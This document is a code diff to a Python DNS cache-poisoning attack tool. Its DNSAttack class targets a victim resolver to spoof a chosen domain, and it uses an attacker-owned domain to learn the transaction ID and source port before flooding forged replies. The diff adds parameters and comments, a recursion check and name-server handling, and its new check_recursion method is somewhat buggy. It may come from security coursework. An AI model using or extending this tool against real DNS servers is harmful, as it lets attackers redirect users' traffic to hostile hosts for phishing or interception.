@@ -15,6 +15,7 @@ from enum import Enum
 
 
 from dns_poisoning import DNSPoisoning
+
 ##  @class DNSAttack
 #
 #   @brief Class to handle DNSPoisonig procedures
@@ -37,8 +38,7 @@ class DNSAttack:
     #
     #   @param victim_server_ip
     #   @param attacked_domain 
-    #   @param bad_udp_ip   The UDP server IP
-    #   @param bad_udp_port The UDP server port
+    #   @param bad_server_data (ip, port) The UDP server IP and port
     #   @param attacker_ip
     #   @param victim_mac   The victim server MAC address (Only required for faster flooding)
     #   @param ns_server_ip The authoritative NS server for the target domain
@@ -51,26 +51,38 @@ class DNSAttack:
     #   @todo Check if port and IP are valid
 
     def __init__(self, victim_server_ip, attacked_domain, bad_server_data,\
-         attacker_ip, ns_server_ip=None, victim_mac=None, nic_interface=None,\
+         attacker_ip, bad_domain, ns_server_ip=None, victim_mac=None, nic_interface=None,\
              attack_type=None, sigint_handler=None, log_function=lambda msg: None):
 
+        # Victim IP address
         self.victim_server_ip = victim_server_ip
+        ## Attacker IP address
         self.attacker_ip = attacker_ip
+        ## Domain to spoof
         self.domain = attacked_domain
+        ## Light DNS IP
         self.bad_udp_ip = bad_server_data[0]
+        ## Light DNS port
         self.bad_udp_port = bad_server_data[1]
+        ## Domain owned by the attacker, used to fetch TXID and source port
+        self.bad_domain = bad_domain
 
         #Only required for faster flooding
+        ## Victim MAC address (only for faster flooding)
         self.victim_mac = victim_mac
+        ## Network Card Interface to use (only for faster flooding)
         self.nic_interface = nic_interface
 
 
 
         #Enchant parameters
+        ## SIGINT (Ctrl+C) handler to use 
         self.sigint_handler = sigint_handler
+        ## Logging function to use
         self.log = log_function
 
         #Internal Variable
+        ## Stop running procedures
         self.stop_flag = False
 
         # Check Parameter
@@ -176,7 +188,7 @@ class DNSAttack:
         victim_server.nameservers = [self.victim_server_ip]
 
         try:
-            answer = victim_server.query("badguy.ru", "A")
+            answer = victim_server.query(self.bad_domain, "A")
             for rdata in answer:
                     self.log("Query response received", 2)
         except:
@@ -245,6 +257,38 @@ class DNSAttack:
         return False       
 
 
+    def check_recursion(self, dns_server_ip=None, domain=None):
+        import time
+
+        if dns_server_ip is None:
+            dns_server_ip = self.victim_server_ip
+
+        if domain is None:
+            domain = self.domain
+
+        dns_server = dns.resolver.Resolver()
+        dns_server.nameservers = [dns_server_ip]
+
+        try:
+            response = dns_server.query(domain, 'A')
+        except dns.resolver.NoAnswer:
+            print("DNS response error")
+            return False
+        except dns.resolver.NXDOMAIN:
+            self.log("(Checking Recursion) - No response found", 4)
+
+        time.sleep(2)
+
+        if response is None:
+            print("No response")
+
+        if response.RA is None:
+            print("Recursion not available")
+        else:
+            print("Recursion Available")        
+
+
+
     ##  
     #   @brief Start the attack
     #   @param number_of_tries (int) The number of tentative (Default 50)
@@ -304,7 +348,7 @@ class DNSAttack:
 
 
             # Create the Poisoning Object
-            poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, None, fetched_id, sport = source_port,\
+            poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, self.ns_server_ip, fetched_id, sport = source_port,\
                 victim_mac=self.victim_mac, interrupt_handler=self.stop_attack, log=self.log, socket=flood_socket)
 
             # Set the attack type
